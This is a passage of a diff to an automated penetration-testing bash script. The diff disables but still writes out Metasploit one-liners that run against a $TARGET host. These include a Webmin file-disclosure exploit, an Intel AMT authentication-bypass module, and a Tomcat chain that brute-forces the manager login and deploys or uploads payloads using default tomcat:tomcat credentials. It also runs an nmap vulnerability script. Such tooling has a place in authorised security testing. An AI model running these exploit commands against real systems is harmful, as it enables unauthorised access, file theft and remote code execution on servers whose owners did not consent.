+  #msfconsole -q -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNING APACHE TOMCAT EXPLOITS $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKRED RUNNING JEXBOSS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -1125,11 +1125,11 @@ if [ -z "$port_10000" ];
 then
   echo -e "$OKRED + -- --=[Port 10000 closed... skipping.$RESET"
 else
-  echo -e "$OKORANGE + -- --=[Port 10000 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
+  echo -e "$OKORANGE + -- --=[Port 10000 opened... $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
 fi
 
 if [ -z "$port_16992" ];
@@ -1145,10 +1145,10 @@ else
   echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 16992 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING INTEL AMT AUTH BYPASS EXPLOIT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/http/intel_amt_digest_bypass; setg RHOSTS \"$TARGET\"; run; back; exit;"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #echo -e "$OKRED RUNNING INTEL AMT AUTH BYPASS EXPLOIT $RESET"
+  #echo -e "${OKGREEN}====================================================================================${RESET}"
+  #msfconsole -q -x "use auxiliary/scanner/http/intel_amt_digest_bypass; setg RHOSTS \"$TARGET\"; run; back; exit;"
 fi
 
 if [ -z "$port_27017" ];
